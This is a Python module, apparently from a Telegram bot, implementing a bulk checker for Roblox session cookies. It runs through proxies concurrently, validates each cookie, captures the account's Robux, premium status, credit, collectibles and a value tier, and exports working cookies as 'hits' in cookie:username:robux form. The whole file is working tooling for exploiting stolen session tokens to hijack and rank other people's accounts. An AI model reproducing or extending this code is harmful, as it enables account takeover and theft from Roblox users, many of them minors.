import asyncio
import aiohttp
import logging
import time
from typing import List, Dict, Optional, Callable
from dataclasses import dataclass, field
from utils.config import Config
from core.proxy_rotator import ProxyRotator
from core.robux_capture import RobuxCapture
from core.user_lookup import UserLookup

logger = logging.getLogger(__name__)


@dataclass
class CheckResult:
    """Result of a single cookie check."""
    cookie: str
    is_valid: bool = False
    is_banned: bool = False
    user_id: Optional[int] = None
    username: Optional[str] = None
    display_name: Optional[str] = None
    robux: int = 0
    premium: bool = False
    credit: float = 0.0
    friends_count: int = 0
    followers_count: int = 0
    groups_count: int = 0
    collectible_count: int = 0
    limited_count: int = 0
    badges_count: int = 0
    join_date: str = "Unknown"
    age_days: int = 0
    description: str = ""
    avatar_url: str = ""
    value_tier: str = "BASIC"
    error: str = ""
    check_time: float = 0.0
    pending_robux: int = 0


@dataclass
class CheckStats:
    """Statistics for a checking session."""
    total: int = 0
    valid: int = 0
    invalid: int = 0
    banned: int = 0
    errors: int = 0
    robux_total: int = 0
    premium_count: int = 0
    limited_count: int = 0
    start_time: float = 0.0
    end_time: float = 0.0

    @property
    def elapsed(self) -> float:
        end = self.end_time or time.time()
        return end - self.start_time

    @property
    def cps(self) -> float:
        """Checks per second."""
        elapsed = self.elapsed
        if elapsed == 0:
            return 0
        return self.total / elapsed


class CookieChecker:
    """
    High-performance async cookie checker with:
    - Concurrent checking with semaphore control
    - Proxy rotation
    - Robux capture
    - Full user lookup
    - Progress callbacks
    """

    def __init__(self, proxy_rotator: Optional[ProxyRotator] = None):
        self.proxy_rotator = proxy_rotator or ProxyRotator()
        self.stats = CheckStats()
        self._semaphore = asyncio.Semaphore(Config.MAX_CONCURRENT)
        self._results: List[CheckResult] = []
        self._progress_callback: Optional[Callable] = None
        self._checked = 0
        self._lock = asyncio.Lock()

    def set_progress_callback(self, callback: Callable):
        """Set callback for progress updates: callback(stats, result)"""
        self._progress_callback = callback

    async def check_cookies(self, cookies: List[str], 
                             user_id: int = None) -> List[CheckResult]:
        """
        Check a list of cookies concurrently.
        Returns list of CheckResult objects.
        """
        self.stats = CheckStats(start_time=time.time())
        self._results = []
        self._checked = 0

        if not cookies:
            return []

        # Deduplicate while preserving order
        seen = set()
        unique_cookies = []
        for c in cookies:
            if c not in seen:
                seen.add(c)
                unique_cookies.append(c)

        self.stats.total = len(unique_cookies)

        # Create session with optimized settings
        connector = aiohttp.TCPConnector(
            limit=Config.MAX_CONCURRENT + 10,
            limit_per_host=5,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            force_close=False,
        )

        timeout = aiohttp.ClientTimeout(total=Config.CHECK_TIMEOUT)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Create tasks
            tasks = []
            for cookie in unique_cookies:
                task = self._check_single(session, cookie, user_id)
                tasks.append(task)

            # Run all with concurrency control
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for r in results:
                if isinstance(r, CheckResult):
                    self._results.append(r)
                    self._update_stats(r)
                elif isinstance(r, Exception):
                    logger.error(f"Check task error: {r}")
                    self.stats.errors += 1

        self.stats.end_time = time.time()
        return self._results

    async def _check_single(self, session: aiohttp.ClientSession, 
                              cookie: str, user_id: int = None) -> CheckResult:
        """Check a single cookie with full capture."""
        async with self._semaphore:
            start = time.time()
            result = CheckResult(cookie=cookie)

            # Get proxy
            proxy = None
            if self.proxy_rotator and Config.PROXY_ENABLED:
                proxy = await self.proxy_rotator.get_proxy()

            try:
                # Step 1: Validate cookie and get user info
                user_info = await UserLookup.get_user_info(session, cookie, proxy)

                if user_info is None:
                    # Cookie is invalid
                    result.is_valid = False
                    result.check_time = time.time() - start
                    async with self._lock:
                        self._checked += 1
                        if self._progress_callback:
                            await self._progress_callback(self.stats, result)
                    return result

                # Cookie is valid - populate user data
                result.is_valid = True
                result.user_id = user_info.get("user_id")
                result.username = user_info.get("username", "Unknown")
                result.display_name = user_info.get("display_name", "")
                result.is_banned = user_info.get("is_banned", False)
                result.friends_count = user_info.get("friends_count", 0)
                result.followers_count = user_info.get("followers_count", 0)
                result.groups_count = user_info.get("groups_count", 0)
                result.collectible_count = user_info.get("collectible_count", 0)
                result.limited_count = user_info.get("limited_count", 0)
                result.badges_count = user_info.get("badges_count", 0)
                result.join_date = user_info.get("join_date", "Unknown")
                result.age_days = user_info.get("age_days", 0)
                result.description = user_info.get("description", "")
                result.avatar_url = user_info.get("avatar_url", "")

                # Step 2: Capture Robux and financial data
                try:
                    robux_data = await RobuxCapture.get_robux_balance(
                        session, cookie, result.user_id, proxy
                    )
                    result.robux = robux_data.get("robux", 0)
                    result.premium = robux_data.get("premium", False)
                    result.credit = robux_data.get("credit", 0.0)
                    result.pending_robux = robux_data.get("pending_robux", 0)
                except Exception as e:
                    logger.debug(f"Robux capture failed for {result.username}: {e}")

                # Step 3: Calculate value tier
                result.value_tier = user_info.get("value_tier", "BASIC")

                # Report proxy success
                if proxy and self.proxy_rotator:
                    await self.proxy_rotator.report_success(proxy)

            except asyncio.TimeoutError:
                result.is_valid = False
                result.error = "Timeout"
                if proxy and self.proxy_rotator:
                    await self.proxy_rotator.report_fail(proxy)
            except aiohttp.ClientError as e:
                result.is_valid = False
                result.error = f"Client error: {str(e)[:50]}"
                if proxy and self.proxy_rotator:
                    await self.proxy_rotator.report_fail(proxy)
            except Exception as e:
                result.is_valid = False
                result.error = f"Error: {str(e)[:50]}"
                if proxy and self.proxy_rotator:
                    await self.proxy_rotator.report_fail(proxy)

            result.check_time = time.time() - start

            # Small delay to avoid rate limiting
            if Config.DELAY_BETWEEN > 0:
                await asyncio.sleep(Config.DELAY_BETWEEN)

            async with self._lock:
                self._checked += 1
                if self._progress_callback:
                    await self._progress_callback(self.stats, result)

            return result

    def _update_stats(self, result: CheckResult):
        """Update running statistics with a new result."""
        if result.is_valid:
            if result.is_banned:
                self.stats.banned += 1
            else:
                self.stats.valid += 1
            self.stats.robux_total += result.robux
            if result.premium:
                self.stats.premium_count += 1
            if result.limited_count > 0:
                self.stats.limited_count += 1
        else:
            self.stats.invalid += 1

    def get_valid_results(self) -> List[CheckResult]:
        """Get only valid (non-banned) results."""
        return [r for r in self._results if r.is_valid and not r.is_banned]

    def get_banned_results(self) -> List[CheckResult]:
        """Get banned accounts."""
        return [r for r in self._results if r.is_valid and r.is_banned]

    def get_invalid_results(self) -> List[CheckResult]:
        """Get invalid cookies."""
        return [r for r in self._results if not r.is_valid]

    def format_result_text(self, result: CheckResult) -> str:
        """Format a single result for display in Telegram."""
        if not result.is_valid:
            return f"❌ Invalid Cookie | {result.cookie[:20]}..."

        lines = []
        lines.append(f"{'🚫' if result.is_banned else '✅'} {'BANNED' if result.is_banned else 'VALID'} | {result.value_tier}")
        lines.append(f"👤 {result.display_name} (@{result.username})")
        lines.append(f"🆔 ID: {result.user_id}")
        lines.append(f"🔗 https://www.roblox.com/users/{result.user_id}/profile")

        if result.robux > 0:
            lines.append(f"💰 Robux: {result.robux:,}")
        if result.premium:
            lines.append(f"⭐ Premium: Yes")
        if result.credit > 0:
            lines.append(f"💳 Credit: ${result.credit:.2f}")
        if result.pending_robux and result.pending_robux > 0:
            lines.append(f"⏳ Pending Robux: {result.pending_robux:,}")

        lines.append(f"📅 Joined: {result.join_date} ({result.age_days:,} days)")
        lines.append(f"👥 Friends: {result.friends_count:,} | Followers: {result.followers_count:,}")
        lines.append(f"🏠 Groups: {result.groups_count} | 🏅 Badges: {result.badges_count}")

        if result.collectible_count > 0:
            lines.append(f"💎 Collectibles: {result.collectible_count} | Limiteds: {result.limited_count}")

        if result.description:
            lines.append(f"📝 {result.description}")

        return "\n".join(lines)

    def format_stats_text(self) -> str:
        """Format session statistics for Telegram."""
        elapsed = self.stats.elapsed
        cps = self.stats.cps

        lines = [
            f"📊 **Check Complete**",
            f"",
            f"⏱ Time: {elapsed:.1f}s | Speed: {cps:.1f}/s",
            f"📦 Total: {self.stats.total}",
            f"✅ Valid: {self.stats.valid}",
            f"❌ Invalid: {self.stats.invalid}",
            f"🚫 Banned: {self.stats.banned}",
            f"💰 Total Robux: {self.stats.robux_total:,}",
            f"⭐ Premium: {self.stats.premium_count}",
            f"💎 Has Limiteds: {self.stats.limited_count}",
        ]

        if self.proxy_rotator:
            lines.append(f"🔄 {self.proxy_rotator.get_stats()}")

        return "\n".join(lines)

    def generate_results_file(self) -> str:
        """Generate a text file content with all results."""
        lines = []
        lines.append("=" * 60)
        lines.append("ROBLOX COOKIE CHECKER RESULTS")
        lines.append("=" * 60)
        lines.append("")

        # Valid accounts
        valid = self.get_valid_results()
        if valid:
            lines.append(f"--- VALID ACCOUNTS ({len(valid)}) ---")
            lines.append("")
            for r in valid:
                lines.append(f"Cookie: {r.cookie}")
                lines.append(f"Username: {r.username} | ID: {r.user_id}")
                lines.append(f"Robux: {r.robux} | Premium: {r.premium} | Tier: {r.value_tier}")
                lines.append(f"Friends: {r.friends_count} | Followers: {r.followers_count}")
                lines.append(f"Groups: {r.groups_count} | Collectibles: {r.collectible_count}")
                lines.append(f"Join Date: {r.join_date} | Age: {r.age_days} days")
                lines.append("-" * 40)
            lines.append("")

        # Banned accounts
        banned = self.get_banned_results()
        if banned:
            lines.append(f"--- BANNED ACCOUNTS ({len(banned)}) ---")
            lines.append("")
            for r in banned:
                lines.append(f"Cookie: {r.cookie}")
                lines.append(f"Username: {r.username} | ID: {r.user_id}")
                lines.append("-" * 40)
            lines.append("")

        # Invalid cookies
        invalid = self.get_invalid_results()
        if invalid:
            lines.append(f"--- INVALID COOKIES ({len(invalid)}) ---")
            lines.append("")
            for r in invalid:
                lines.append(f"Cookie: {r.cookie[:30]}...")
                lines.append("-" * 40)

        lines.append("")
        lines.append("=" * 60)
        lines.append(self.format_stats_text())
        lines.append("=" * 60)

        return "\n".join(lines)

    def generate_hits_file(self) -> str:
        """Generate hits file with only valid cookie:username:robux format."""
        lines = []
        for r in self.get_valid_results():
            lines.append(f"{r.cookie}:{r.username}:{r.robux}")
        return "\n".join(lines)